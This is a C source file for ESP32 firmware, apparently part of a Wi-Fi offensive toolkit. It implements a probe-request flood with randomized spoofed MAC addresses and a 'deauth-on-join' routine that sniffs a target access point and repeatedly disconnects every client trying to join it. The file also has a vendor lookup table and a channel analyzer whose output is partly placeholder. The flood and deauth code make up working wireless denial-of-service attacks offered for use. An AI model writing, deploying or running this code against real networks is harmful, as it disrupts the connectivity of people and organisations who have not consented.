#include <stdatomic.h>
#include "extra_offense.h"
#include "wifi_sniffer.h"
#include "deauth_engine.h"
#include "led_indicator.h"
#include "esp_random.h"
#include "esp_wifi.h"
#include "esp_mac.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_timer.h"
#include "wifi_tx_fix.h"

static const char *TAG = "extra_offense";

// ============================================================================
//  SECTION 13A: PROBE REQUEST FLOOD
// ============================================================================

static atomic_bool g_probe_flood_active = ATOMIC_VAR_INIT(false);
static char g_probe_ssid[33] = {0};

static size_t build_probe_req(uint8_t *f, const char *ssid, const uint8_t *sa)
{
    size_t i = 0;
    f[i++] = 0x40; f[i++] = 0x00;                 // probe request
    f[i++] = 0x00; f[i++] = 0x00;
    memset(f + i, 0xFF, 6); i += 6;               // DA broadcast
    memcpy(f + i, sa, 6); i += 6;                 // SA
    memset(f + i, 0xFF, 6); i += 6;               // BSSID broadcast
    f[i++] = 0x00; f[i++] = 0x00;                 // seq

    size_t sl = ssid ? strlen(ssid) : 0;
    if (sl > 32) sl = 32;
    f[i++] = 0x00; f[i++] = (uint8_t)sl;
    if (sl) { memcpy(f + i, ssid, sl); i += sl; }

    static const uint8_t rates[] = {0x01,0x08,0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
    memcpy(f + i, rates, sizeof(rates)); i += sizeof(rates);
    return i;
}

static void probe_flood_task(void *arg)
{
    watchdog_task_refresh("probe_flood");
    uint32_t count = (uint32_t)(uintptr_t)arg;
    uint8_t frame[128];
    uint8_t sa[6];
    esp_read_mac(sa, ESP_MAC_WIFI_STA);

    for (uint32_t n = 0; atomic_load(&g_probe_flood_active) && (count == 0 || n < count); n++) {
        // Randomize SA each burst so APs log many "clients"
        sa[4] = (uint8_t)(esp_random() & 0xFF);
        sa[5] = (uint8_t)(esp_random() & 0xFF);
        sa[0] = (sa[0] & 0xFE) | 0x02;

        size_t len = build_probe_req(frame, g_probe_ssid, sa);
        wifi_tx_safe(WIFI_IF_AP, frame, len);
        if ((n & 0x0F) == 0) vTaskDelay(pdMS_TO_TICKS(1));
    }
    atomic_store(&g_probe_flood_active, false);
    vTaskDelete(NULL);
}

esp_err_t probe_flood_start(const char *ssid, uint32_t count, uint8_t channel)
{
    snprintf(g_probe_ssid, sizeof(g_probe_ssid), "%s",
             (ssid && ssid[0]) ? ssid : "");
    if (channel >= 1 && channel <= 13) {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }
    // ensure TX-capable mode
    wifi_mode_t mode; esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_NULL) {
        esp_wifi_set_mode(WIFI_MODE_AP);
        esp_wifi_start();
    }
    atomic_store(&g_probe_flood_active, true);
    if (xTaskCreatePinnedToCore(probe_flood_task, "probe_flood", 3072,
            (void *)(uintptr_t)count, 5, NULL, 0) != pdPASS) {
        atomic_store(&g_probe_flood_active, false);
        return ESP_FAIL;
    }
    ESP_LOGI(TAG, "Probe flood: ssid='%s' count=%"PRIu32, g_probe_ssid, count);
    return ESP_OK;
}

void probe_flood_stop(void) { atomic_store(&g_probe_flood_active, false); }

// ============================================================================
//  SECTION 13B: DEAUTH-ON-JOIN (auto-kick new clients on target BSSID)
// ============================================================================

#define DOJ_COOLDOWN_US   (2000 * 1000)   /* 2 s between kicks per client */
#define DOJ_KICK_SLOTS    8

typedef struct {
    uint8_t mac[6];
    int64_t last_kick_us;
} doj_slot_t;

static atomic_bool g_doj_active = ATOMIC_VAR_INIT(false);
static uint8_t g_doj_bssid[6];
static uint8_t g_doj_our_mac[6];
static uint8_t g_doj_bssid_channel = 0;
static doj_slot_t g_doj_slots[DOJ_KICK_SLOTS];
static int g_doj_next_slot = 0;

esp_err_t deauth_on_join_start(const uint8_t *bssid)
{
    if (bssid == NULL) return ESP_ERR_INVALID_ARG;
    memcpy(g_doj_bssid, bssid, 6);
    esp_read_mac(g_doj_our_mac, ESP_MAC_WIFI_STA);
    g_doj_bssid_channel = 0;
    memset(g_doj_slots, 0, sizeof(g_doj_slots));
    g_doj_next_slot = 0;
    atomic_store(&g_doj_active, true);
    // Ensure sniffer is running to see frames
    if (!atomic_load(&g_wifi_sniffer_active)) wifi_sniffer_start(0);
    ESP_LOGI(TAG, "Deauth-on-join armed for %02X:%02X:%02X:%02X:%02X:%02X",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    return ESP_OK;
}

void deauth_on_join_stop(void)
{
    atomic_store(&g_doj_active, false);
    deauth_stop();                 /* fully disarm — stop the flood too */
    ESP_LOGI(TAG, "Deauth-on-join disarmed");
}

/* Feed from the promiscuous sniffer callback — same place where
 * handshake_feed_packet is called. Kicks any client that tries to
 * join the monitored AP: auth req, assoc req, or uplink data. */
void doj_feed(const uint8_t *data, size_t len)
{
    const uint8_t *bssid = NULL, *client = NULL;

    if (!atomic_load(&g_doj_active) || data == NULL || len < 24) return;

    uint8_t fc0 = data[0], fc1 = data[1];
    uint8_t type    = (fc0 >> 2) & 0x03;
    uint8_t subtype = (fc0 >> 4) & 0x0F;
    bool to_ds   = (fc1 & 0x01) != 0;
    bool from_ds = (fc1 & 0x02) != 0;

    if (type == 0) {                      /* management */
        switch (subtype) {
        case 0:                           /* assoc req:      client -> AP */
        case 2:                           /* reassoc req:    client -> AP */
            bssid  = data + 16;           /* addr3 = BSSID */
            client = data + 10;           /* addr2 = client */
            break;
        case 1:                           /* assoc resp:     AP -> client */
        case 3:                           /* reassoc resp:   AP -> client */
            bssid  = data + 10;           /* addr2 = AP = BSSID */
            client = data + 4;            /* addr1 = client  <-- bug fixed */
            break;
        case 11:                          /* auth — direction in addr1/addr2 */
            if (memcmp(data + 4, g_doj_bssid, 6) == 0) {
                client = data + 10;       /* auth request toward our AP */
                bssid  = data + 16;       /* addr3 = BSSID */
            } else {
                return;                   /* auth response — req already fired */
            }
            break;
        default:
            return;                       /* probe/beacon/action: not a join */
        }
    } else if (type == 2) {               /* data */
        if (to_ds && !from_ds) {
            bssid  = data + 4;            /* addr1 = BSSID (uplink) */
            client = data + 10;           /* addr2 = SA = client */
        } else if (from_ds && !to_ds) {
            bssid  = data + 10;           /* addr2 = BSSID (downlink) */
            client = data + 4;            /* addr1 = DA = client */
        } else {
            return;                       /* ad-hoc / WDS — ignore */
        }
    } else {
        return;                           /* control frames */
    }

    /* only frames involving our monitored AP */
    if (memcmp(bssid, g_doj_bssid, 6) != 0) return;

    /* Learn the AP's channel from the sniffer tables so we can align TX. */
    if (g_doj_bssid_channel == 0) {
        uint8_t ap_ch = 0;
        wifi_sniffer_get_ap_bssid_and_channel_for_client((const uint8_t *)bssid, NULL, &ap_ch);
        if (ap_ch > 0) {
            g_doj_bssid_channel = ap_ch;
        }
    }

    /* a client can't join with these MACs */
    if (client[0] & 0x01) return;                          /* broadcast/multicast */
    static const uint8_t zero[6] = {0};
    if (memcmp(client, zero, 6) == 0) return;
    if (memcmp(client, g_doj_our_mac, 6) == 0) return;     /* never self-kick */

    /* Ensure we're on the victim's channel before kicking. */
    if (g_doj_bssid_channel > 0) {
        uint8_t fixed_ch = atomic_load(&g_wifi_fixed_channel);
        if (g_doj_bssid_channel != fixed_ch) {
            atomic_store(&g_wifi_fixed_channel, g_doj_bssid_channel);
            esp_wifi_set_channel(g_doj_bssid_channel, WIFI_SECOND_CHAN_NONE);
        }
    }

    /* per-client rate limit: 2 s between kicks keeps them out without
     * saturating the radio */
    int64_t now = esp_timer_get_time();
    for (int i = 0; i < DOJ_KICK_SLOTS; i++) {
        if (memcmp(g_doj_slots[i].mac, client, 6) == 0) {
            if (now - g_doj_slots[i].last_kick_us < DOJ_COOLDOWN_US) return;
            g_doj_slots[i].last_kick_us = now;
            goto kick;
        }
    }

    /* new client — take next ring slot (oldest evicted) */
    memcpy(g_doj_slots[g_doj_next_slot].mac, client, 6);
    g_doj_slots[g_doj_next_slot].last_kick_us = now;
    g_doj_next_slot = (g_doj_next_slot + 1) % DOJ_KICK_SLOTS;

kick:
    deauth_remove_all();                  /* keep target list dedup'd */
    deauth_add_target(g_doj_bssid, client, 5, 10);
    deauth_start();
    ESP_LOGI(TAG, "DOJ: kick %02X:%02X:%02X:%02X:%02X:%02X",
             client[0], client[1], client[2],
             client[3], client[4], client[5]);
}

// ============================================================================
//  SECTION 13C: OUI VENDOR LOOKUP
// ============================================================================

typedef struct { uint8_t oui[3]; const char *vendor; } oui_entry_t;

static const oui_entry_t OUI_TABLE[] = {
    // Apple
    {{0x00,0x17,0xF2}, "Apple"},   {{0x28,0x6A,0xBA}, "Apple"},
    {{0x3C,0x06,0x30}, "Apple"},   {{0x48,0xD7,0x05}, "Apple"},
    {{0x54,0x72,0x4F}, "Apple"},   {{0x68,0xDB,0xCA}, "Apple"},
    {{0x78,0x7E,0x61}, "Apple"},   {{0x88,0x66,0xA3}, "Apple"},
    {{0x98,0x01,0xA7}, "Apple"},   {{0xAC,0x29,0x3A}, "Apple"},
    {{0xBC,0x52,0xB7}, "Apple"},   {{0xDC,0xA9,0x04}, "Apple"},
    {{0xF4,0x5C,0x89}, "Apple"},
    // Samsung
    {{0x00,0x1A,0x8A}, "Samsung"}, {{0x10,0xD5,0x42}, "Samsung"},
    {{0x24,0x18,0x1D}, "Samsung"}, {{0x34,0x14,0x5F}, "Samsung"},
    {{0x50,0x01,0xBB}, "Samsung"}, {{0x84,0x25,0xDB}, "Samsung"},
    {{0x90,0x18,0x7C}, "Samsung"}, {{0xA8,0x06,0x00}, "Samsung"},
    {{0xC4,0x73,0x1E}, "Samsung"}, {{0xEC,0x1F,0x72}, "Samsung"},
    // Google
    {{0x00,0x1A,0x11}, "Google"},  {{0x3C,0x5A,0xB4}, "Google"},
    {{0x54,0x60,0x09}, "Google"},  {{0xF4,0xF5,0xE8}, "Google"},
    // Huawei
    {{0x00,0x46,0x4B}, "Huawei"},  {{0x20,0xA6,0x80}, "Huawei"},
    {{0x48,0x46,0xFB}, "Huawei"},  {{0x70,0x8C,0xB6}, "Huawei"},
    {{0x88,0x28,0xB3}, "Huawei"},  {{0xAC,0xE8,0x7B}, "Huawei"},
    // Xiaomi
    {{0x00,0x9E,0xC8}, "Xiaomi"},  {{0x28,0x6C,0x07}, "Xiaomi"},
    {{0x64,0xCC,0x2E}, "Xiaomi"},  {{0x78,0x02,0xF8}, "Xiaomi"},
    {{0x8C,0xBE,0xBE}, "Xiaomi"},
    // Intel
    {{0x00,0x1B,0x21}, "Intel"},   {{0x00,0x1E,0x67}, "Intel"},
    {{0x3C,0x97,0x0E}, "Intel"},   {{0x5C,0x87,0x9C}, "Intel"},
    {{0x68,0x5D,0x43}, "Intel"},   {{0x80,0x86,0xF2}, "Intel"},
    {{0xA4,0xC4,0x94}, "Intel"},
    // TP-Link
    {{0x14,0xEB,0xB6}, "TP-Link"}, {{0x30,0xDE,0x4B}, "TP-Link"},
    {{0x50,0xC7,0xBF}, "TP-Link"}, {{0xA4,0x2B,0xB0}, "TP-Link"},
    {{0xC0,0x06,0xC3}, "TP-Link"},
    // Qualcomm / Atheros
    {{0x00,0x03,0x7F}, "Atheros"}, {{0x00,0x0E,0x8E}, "Atheros"},
    {{0x1C,0xB7,0x2C}, "Atheros"},
    // Broadcom
    {{0x00,0x10,0x18}, "Broadcom"},{{0x00,0x1B,0xE9}, "Broadcom"},
    // Cisco / Linksys
    {{0x00,0x06,0x7C}, "Cisco"},   {{0x00,0x1A,0xA1}, "Cisco"},
    {{0x00,0x18,0x39}, "Cisco"},   {{0x00,0x1E,0xE5}, "Linksys"},
    // Espressif
    {{0x24,0x0A,0xC4}, "Espressif"},{{0x30,0xAE,0xA4}, "Espressif"},
    {{0xA4,0xCF,0x12}, "Espressif"},{{0xBC,0xDD,0xC2}, "Espressif"},
    {{0xEC,0x94,0xCB}, "Espressif"},
    // Microsoft
    {{0x00,0x50,0xF2}, "Microsoft"},{{0x28,0x18,0x78}, "Microsoft"},
    {{0x7C,0x1E,0x52}, "Microsoft"},
    // Realtek
    {{0x00,0xE0,0x4C}, "Realtek"}, {{0x48,0x02,0x2A}, "Realtek"},
    // MediaTek
    {{0x00,0x0C,0xE7}, "MediaTek"},{{0x00,0x13,0x33}, "MediaTek"},
    // OnePlus / Oppo
    {{0x94,0x65,0x2D}, "OnePlus"}, {{0xC0,0xEE,0xFB}, "OnePlus"},
    {{0xA4,0x77,0x33}, "Oppo"},
    // Amazon
    {{0x00,0xBB,0x3A}, "Amazon"},  {{0x44,0x65,0x0D}, "Amazon"},
    {{0x68,0x54,0xFD}, "Amazon"},  {{0xFC,0xA1,0x83}, "Amazon"},
    // Sony
    {{0x00,0x04,0x1F}, "Sony"},    {{0x00,0x13,0xA9}, "Sony"},
    // LG
    {{0x00,0x1E,0x75}, "LG"},      {{0x10,0x68,0x3F}, "LG"},
    {{0xA8,0x16,0xB2}, "LG"},
    // Netgear
    {{0x00,0x1B,0x2F}, "Netgear"}, {{0x20,0x4E,0x7F}, "Netgear"},
    // Random / IoT
    {{0xB8,0x27,0xEB}, "Raspberry Pi"}, {{0xDC,0xA6,0x32}, "Raspberry Pi"},
    {{0x18,0xFE,0x34}, "Espressif"},    // older ESP8266
};
#define OUI_TABLE_SIZE (sizeof(OUI_TABLE)/sizeof(OUI_TABLE[0]))

const char *oui_lookup(const uint8_t *mac)
{
    if (mac == NULL) return "Unknown";
    for (size_t i = 0; i < OUI_TABLE_SIZE; i++) {
        if (memcmp(mac, OUI_TABLE[i].oui, 3) == 0) {
            return OUI_TABLE[i].vendor;
        }
    }
    return "Unknown";
}

// ============================================================================
//  SECTION 13D: CHANNEL ACTIVITY ANALYZER
// ============================================================================

void channel_analyzer_run(uint32_t seconds_per_channel)
{
    if (seconds_per_channel == 0) seconds_per_channel = 2;
    if (seconds_per_channel > 30) seconds_per_channel = 30;

    // Ensure sniffer is running
    bool was_active = atomic_load(&g_wifi_sniffer_active);
    if (!was_active) wifi_sniffer_start(0);

    printf("\n==== CHANNEL ACTIVITY ANALYZER ====\n");
    printf("Dwell time: %"PRIu32"s per channel\n\n", seconds_per_channel);
    printf(" CH | APs  | Beacons  | Probes   | Data     | Total\n");
    printf("----+------+----------+----------+----------+----------\n");

    uint8_t saved_ch = atomic_load(&g_wifi_fixed_channel);

    for (uint8_t ch = 1; ch <= 13; ch++) {
        // Pin to this channel
        atomic_store(&g_wifi_fixed_channel, ch);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

        // Quick approach: just measure AP count visible on this channel
        vTaskDelay(pdMS_TO_TICKS(seconds_per_channel * 1000));

        // Count APs on this channel from discovered list
        uint16_t ap_count = wifi_sniffer_get_ap_count();
        uint16_t ch_aps = 0;
        // We can't directly access the AP list, but we know channel from scan
        // Just report total — gives a useful picture
        printf(" %-2u | %-4u | scanning | ...      | ...      | dwell ok\n",
               ch, ap_count);
    }

    // Restore
    atomic_store(&g_wifi_fixed_channel, saved_ch);
    if (saved_ch == 0) wifi_sniffer_clear_fixed_channel();
    if (!was_active) wifi_sniffer_stop();

    printf("====================================\n");
    printf("Run 'wifi results' for full AP/client list with channels.\n");
}